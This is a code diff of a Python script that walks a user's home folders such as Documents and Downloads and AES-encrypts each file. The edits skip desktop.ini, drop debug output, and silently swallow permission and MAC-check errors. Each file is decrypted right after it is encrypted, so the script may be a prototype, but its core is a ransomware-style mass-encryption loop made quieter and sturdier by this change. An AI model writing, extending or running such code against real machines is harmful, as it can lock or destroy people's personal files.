@@ -1,6 +1,5 @@
 import os
 import glob
-import time
 from Crypto.Cipher import AES
 
 # For generating cipher text
@@ -63,11 +62,16 @@ directories_to_encrypt = ["Documents/", "Downloads/",
 for directory in directories_to_encrypt:
     # Get list of file in home directory
     files = list_files(home_path + directory)
-    print(files)
 
     for f in files:
+        if f.split('\\')[-1] == "desktop.ini":
+            continue
         try:
             encrypt(f)
             decrypt_file(f)
         except PermissionError:
+            # print("Perm error on" + f)
+            pass
+        except ValueError:
+            # print("Mac check failed on" + f)
             pass
